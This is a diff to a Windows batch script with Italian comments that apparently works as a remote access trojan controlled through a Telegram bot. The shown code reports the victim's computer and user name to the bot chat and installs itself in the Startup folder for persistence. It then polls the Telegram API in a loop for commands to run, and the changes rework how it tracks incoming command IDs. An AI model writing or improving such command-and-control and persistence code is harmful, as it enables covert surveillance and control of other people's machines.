@@ -15,13 +15,15 @@ set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
 set "URL_FILE=%TEMP%\last_url.txt"
 set "PROCESSED_URLS=%TEMP%\processed_urls.txt"
 
-:: RESETTA i vecchi comandi su Telegram
-curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" > nul
+:: Invia notifica di connessione e ottieni l'ultimo update_id
+for /f "tokens=*" %%A in ('curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" ^| powershell -command "$json=ConvertFrom-Json ($input); if($json.ok -and $json.result) { $json.result[-1].update_id } else { 0 }"') do (
+    set "LAST_COMMAND_ID=%%A"
+)
 
-:: Invia notifica di connessione
+:: Notifica connessione
 curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
-    -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%) - Comandi vecchi resettati"
+    -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%)"
 
 :: Aggiungi all'avvio automatico
 if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
@@ -42,21 +44,13 @@ if not exist "%PROCESSED_URLS%" (
     echo. > "%PROCESSED_URLS%"
 )
 
-:: Ottieni l'ID dell'ultimo messaggio all'avvio
-for /f "tokens=2 delims=:" %%A in ('curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" ^| findstr /C:"update_id"') do (
-    for /f "tokens=1 delims=," %%B in ("%%A") do (
-        set "LAST_COMMAND_ID=%%B"
-    )
-)
-if not defined LAST_COMMAND_ID set "LAST_COMMAND_ID=0"
-
 :: Loop principale
 :command_loop
-:: Controlla SOLO i nuovi messaggi
+:: Controlla SOLO nuovi messaggi
 curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_COMMAND_ID%" > "%TEMP%\updates.json"
 
 :: Estrai comandi dai messaggi
-for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok -and $json.result){$update=$json.result[-1];$update.update_id.ToString()+':'+$update.message.text}"') do (
+for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok -and $json.result){$json.result|ForEach-Object{if($_.update_id -gt %LAST_COMMAND_ID%){$LAST_COMMAND_ID=$_.update_id; if($_.message.text){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}}"') do (
     set "update_data=%%A"
     set "LAST_COMMAND_ID=!update_data:*:=!"
     set "command=!update_data:*:=!"
